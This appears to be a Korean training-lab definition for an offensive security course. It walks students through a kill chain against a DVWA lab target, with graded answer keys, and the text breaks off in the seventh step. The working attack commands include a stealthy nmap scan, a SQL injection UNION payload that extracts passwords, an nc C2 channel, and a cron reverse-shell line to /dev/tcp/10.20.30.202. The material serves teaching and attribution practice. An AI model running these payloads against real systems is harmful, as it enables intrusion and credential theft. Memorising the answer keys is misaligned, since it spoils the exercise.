lab_id: standalone-attack-adv-week01
title: "APT 킬체인 — 정찰→열거→침투→발판→C2 전 단계"
version: standalone-attack-adv
course: attack-adv
week: 1
description: |
  공격 고급 W01 — APT 킬체인. 한 번의 익스플로잇이 아니라 정찰→열거→침투→발판→지속성/C2로 이어지는 전
  단계 캠페인을 수행한다. el34-attacker(모의침투 박스: nmap·sqlmap·hydra·gobuster·nc)에서 인가된 표적
  (el34-web 10.20.30.1)에 킬체인을 실행하고, 공격 흔적·귀속(출처 IP 보존)을 이해한다.
  ⚠️ 인가된 실습 환경(el34)에서만. 외부 시스템 공격 절대 금지. 모든 흔적은 self-clean.
difficulty: hard
duration_minutes: 190
prerequisites:
  - "attack 트랙 + soc-adv 킬체인/포렌식 이해"
  - "el34 호스트 SSH + docker exec, el34-attacker 모의침투 박스"
  - "lecture §2(킬체인 단계) §3(도구) §4(OPSEC/귀속) 숙지"
objectives:
  - "APT 킬체인 5단계를 순서대로 수행"
  - "정찰·열거·침투·발판·C2의 도구와 기법 체득"
  - "공격 흔적·귀속(출처 IP 보존)을 방어자 관점에서 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 모의침투 환경·표적 확인
      **실습 의미:** 킬체인 시작 전, 공격 도구(attacker)와 인가된 표적(web)의 도달성을 확인한다. **⚠️ 인가된 el34 표적(10.20.30.1)에만 — 모든 행위는 교육 목적·self-clean.**
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 공격 도구(nmap/sqlmap/hydra/gobuster/nc)가 모두 있으면 toolkit_ok
        command -v nmap sqlmap hydra gobuster nc >/dev/null 2>&1 && echo toolkit_ok
        # 인가 표적(dvwa)에 도달하는지 응답코드 확인
        curl -s -o /dev/null -w "target=%{http_code}\n" -H "Host: dvwa.el34.lab" http://10.20.30.1/
        # 도구가 갖춰졌으면 환경 준비 마커
        command -v nmap nc >/dev/null 2>&1 && echo recon_env_ready
      '
      ```
      ## ✅ 합격 기준
      `recon_env_ready`(과 toolkit_ok·target 코드)가 출력되면 통과. **근거:** 마커는 공격 도구가 실제 존재할 때만 찍히므로, 킬체인을 수행할 모의침투 환경과 인가 표적 도달이 확인됐음을 뜻한다.
    hint: '환경 확인'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c '
        # 공격 도구 가용 확인
        command -v nmap sqlmap hydra gobuster nc >/dev/null 2>&1 && echo toolkit_ok
        # 인가 표적 도달 확인
        curl -s -o /dev/null -w "target=%{http_code}\n" -H "Host: dvwa.el34.lab" http://10.20.30.1/
        # 도구 갖춰졌으면 환경 준비 마커
        command -v nmap nc >/dev/null 2>&1 && echo recon_env_ready
      '
    answer_detail: "환경 = el34-attacker(모의침투 도구)+el34-web(인가 표적). 킬체인 실습의 전제. 인가된 범위만."
    verify:
      type: output_contains
      expect: 'recon_env_ready'
      field: stdout
      semantic: {intent: "환경 확인", success_criteria: ["도구/표적"], acceptable_methods: ["**[OSS] 모의침투 박스 (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 킬체인 ① 정찰 (Reconnaissance, T1046)
      **실습 의미:** 표적의 공격 표면을 파악한다 — 어떤 포트·서비스가 열려 있나. SYN 스텔스(-sS)+저속(-T2)으로 IDS 회피를 시도한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 정찰(T1046): SYN 스텔스(-sS)+저속(-T2 IDS 회피)로 상위 100포트 스캔, 열린 포트 표시
        R=$(nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
        echo "$R"
        # 스캔 결과가 나왔으면 정찰 완료 마커
        [ -n "$R" ] && echo recon_done
      '
      ```
      ## ✅ 합격 기준
      `recon_done`(과 열린 포트)이 출력되면 통과. **근거:** 마커는 스캔이 실제 포트 결과를 반환했을 때만 찍히므로, 공격 표면(다음 공격 후보)을 파악했음을 뜻한다.
    hint: '정찰'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 정찰: SYN 스텔스+저속 스캔
        R=$(nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
        echo "$R"
        # 결과 있으면 정찰 완료 마커
        [ -n "$R" ] && echo recon_done
      '
    answer_detail: "정찰(T1046) = nmap 스텔스 스캔으로 공격 표면 파악. -sS/-T2로 IDS 회피 시도. 킬체인 1단계."
    verify:
      type: output_contains
      expect: 'recon_done'
      field: stdout
      semantic: {intent: "정찰", success_criteria: ["포트 식별"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 킬체인 ② 열거 (Enumeration)
      **실습 의미:** 웹 서비스를 발견했으면 숨은 경로·엔드포인트를 열거한다 — 응답 코드로 존재 경로를 판별해 공격 지점을 좁힌다(실무는 gobuster/nikto).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 열거: 숨은 경로 후보의 응답코드를 확인해 존재 경로를 판별한다
        for p in login.php setup.php vulnerabilities security.php; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" http://10.20.30.1/$p)
          echo "$p=$code"
        done
        # 경로 열거를 수행했으면 마커
        echo enum_done
      '
      ```
      ## ✅ 합격 기준
      `enum_done`(과 경로별 코드)이 출력되면 통과. **근거:** 각 경로의 응답코드가 실제 출력됐다는 건 존재하는 엔드포인트를 판별해 공격 지점을 좁혔다는 뜻이다.
    hint: '열거'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 숨은 경로 응답코드 열거
        for p in login.php setup.php vulnerabilities security.php; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" http://10.20.30.1/$p)
          echo "$p=$code"
        done
        # 열거 수행 마커
        echo enum_done
      '
    answer_detail: "열거 = 숨은 경로/엔드포인트 발견(gobuster/nikto/curl). 공격 표면을 구체적 지점으로 좁힘."
    verify:
      type: output_contains
      expect: 'enum_done'
      field: stdout
      semantic: {intent: "열거", success_criteria: ["엔드포인트"], acceptable_methods: ["**[OSS] gobuster/curl (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 킬체인 ③ 침투 (Exploitation, T1190)
      **실습 의미:** 발견한 취약점을 악용해 침투한다 — SQLi로 데이터 탈취를 시도하며, 고유 태그(User-Agent)로 내 공격을 노이즈와 구분(귀속)한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 침투(T1190): SQLi UNION 자격 탈취 시도 (고유 태그 aa01r1-student로 귀속)
        C=$(curl -s -o /dev/null -w "%{http_code}" -A "aa01r1-student" -H "Host: dvwa.el34.lab" "http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit")
        echo "exploit 응답코드 $C"
        # 익스플로잇을 실제 전송했으면 마커
        [ -n "$C" ] && echo exploit_done
      '
      ```
      ## ✅ 합격 기준
      `exploit_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 SQLi 요청이 실제 전송돼 응답을 받았을 때만 찍히므로, 침투 단계(고유 태그로 귀속 가능한 공격)가 수행됐음을 뜻한다.
    hint: '침투'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 침투(T1190): SQLi UNION 탈취 시도 (태그 aa01r1-student)
        C=$(curl -s -o /dev/null -w "%{http_code}" -A "aa01r1-student" -H "Host: dvwa.el34.lab" "http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit")
        echo "exploit 응답코드 $C"
        # 전송했으면 마커
        [ -n "$C" ] && echo exploit_done
      '
    answer_detail: "침투(T1190) = SQLi UNION 데이터 탈취. 고유 태그로 귀속. sqlmap이 실무 자동화 도구. 킬체인 3단계."
    verify:
      type: output_contains
      expect: 'exploit_done'
      field: stdout
      semantic: {intent: "침투", success_criteria: ["익스플로잇"], acceptable_methods: ["**[OSS] SQLi/sqlmap (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 킬체인 ④ 발판/C2 (Foothold, T1059/T1071)
      **실습 의미:** 침투 후 지속 접근 채널(C2)을 실제로 만든다 — nc 리스너를 띄우고 임플란트가 명령을 보내, 채널이 실제로 동작(수신)하는지 검증한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # nc C2 리스너를 백그라운드로 띄우고 PID를 잡는다 (수신 내용을 /tmp/c2recv에 저장)
        nc -lnp 55001 >/tmp/c2recv 2>/dev/null & P=$!
        sleep 1
        # 임플란트가 명령을 C2 리스너로 전송한다
        printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001
        sleep 1
        # 리스너 종료 후 수신 내용 확인
        kill $P 2>/dev/null
        echo "리스너 수신 내용:"; cat /tmp/c2recv
        # 임플란트 명령이 실제 수신됐으면 C2 채널 동작 마커 + self-clean
        grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok
        rm -f /tmp/c2recv
      '
      ```
      ## ✅ 합격 기준
      `foothold_channel_ok` 출력 시 통과. **근거:** 마커는 C2 리스너가 임플란트 명령을 실제 수신(grep 일치)했을 때만 찍히므로, 가짜 echo가 아니라 C2 채널이 실제로 동작함을 뜻한다.
    hint: '발판/C2'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # nc C2 리스너 띄우고 PID 캡처
        nc -lnp 55001 >/tmp/c2recv 2>/dev/null & P=$!
        sleep 1
        # 임플란트가 명령 전송
        printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001
        sleep 1
        # 리스너 종료 + 수신 확인
        kill $P 2>/dev/null
        echo "리스너 수신 내용:"; cat /tmp/c2recv
        # 명령이 실제 수신됐으면 마커 + self-clean
        grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok
        rm -f /tmp/c2recv
      '
    answer_detail: "발판/C2 = nc 리스너(C2)가 임플란트 명령을 실제 수신함을 grep으로 검증. 가짜 echo 아닌 실제 채널 동작. 킬체인 4단계."
    verify:
      type: output_contains
      expect: 'foothold_channel_ok'
      field: stdout
      semantic: {intent: "발판/C2", success_criteria: ["실제 C2 채널 수신"], acceptable_methods: ["**[OSS] nc C2 (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 킬체인 ⑤ 지속성 (Persistence, T1053)
      **실습 의미:** 재부팅에도 살아남도록 cron 비콘 지속성 항목을 실제로 만들고 검증한다(안전 위해 /tmp, self-clean — 실 엔진은 /etc/cron.d).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # cron 비콘 지속성 항목을 실제 파일로 작성한다 (주기적 C2 재접속)
        echo "* * * * * root bash -c \"bash -i >& /dev/tcp/10.20.30.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron
        echo "작성된 cron 항목:"; cat /tmp/aa01cron
        # 비콘 항목이 실제 작성됐으면 지속성 마커 + self-clean
        grep -q aa01beacon /tmp/aa01cron && echo persistence_planted
        rm -f /tmp/aa01cron
      '
      ```
      ## ✅ 합격 기준
      `persistence_planted` 출력 시 통과. **근거:** 마커는 cron 비콘 항목이 실제 파일로 작성돼 grep으로 확인될 때만 찍히므로, 가짜 echo가 아니라 지속성 아티팩트가 생성됐음을 뜻한다(흔적은 soc-adv W06 헌팅에 잡힘).
    hint: '지속성'
    category: analysis
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # cron 비콘 지속성 항목 작성 (/tmp 안전 시연)
        echo "* * * * * root bash -c \"bash -i >& /dev/tcp/10.20.30.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron
        echo "작성된 cron 항목:"; cat /tmp/aa01cron
        # 비콘 항목 작성 확인 시 마커 + self-clean
        grep -q aa01beacon /tmp/aa01cron && echo persistence_planted
        rm -f /tmp/aa01cron
      '
    answer_detail: "지속성(T1053) = cron 비콘 항목을 실제 작성·grep 검증·self-clean. 가짜 echo 아닌 실제 아티팩트 생성. 킬체인 5단계."
    verify:
      type: output_contains
      expect: 'persistence_planted'
      field: stdout
      semantic: {intent: "지속성", success_criteria: ["cron 항목 실생성"], acceptable_methods: ["**[OSS] cron 비콘 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 OPSEC·귀속 — 내가 남긴 흔적 실측
      **실습 의미:** 공격자도 흔적을 남긴다 — 태그 단 공격을 실제로 보내고, 타깃 로그에 내 흔적이 남는지 직접 확인한다(el34는 SNAT 없어 출처·태그 보존=완벽한 은신은 없다).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 태그(aa01opsec) 단 공격을 타깃에 보낸다
      docker exec el34-attacker sh -c 'curl -s -o /dev/null -A "aa01opsec" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?t=aa01opsec"'
      # 2) 타깃 웹 로그에 내 태그 흔적이 남았는지 확인한다 (출처/태그 보존 → 귀속)
      docker exec el34-web sh -c 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log 2>/dev/null); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
      ```
      ## ✅ 합격 기준
      `opsec_trace_left`(과 흔적 건수)가 출력되면 통과. **근거:** 마커는 내 태그 단 공격이 타깃 로그에 실제 남아 grep으로 1건 이상 발견될 때만 찍히므로, 방어자가 출처·태그로 귀속할 수 있음을 실증한다.
    hint: 'OPSEC/귀속'
    category: report
    points: 12
    answer: |
      # 1) 태그(aa01opsec) 단 공격 송신
      docker exec el34-attacker sh -c 'curl -s -o /dev/null -A "aa01opsec" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?t=aa01opsec"'
      # 2) 타깃 로그에 흔적 남았는지 grep으로 확인
      docker exec el34-web sh -c 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log 2>/dev/null); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
    answer_detail: "OPSEC/귀속 = 태그 단 공격을 실제 송신→타깃 로그 grep으로 흔적 확인. 가짜 echo 아닌 실측. el34 출처 보존이 귀속 기반."
    verify:
      type: output_contains
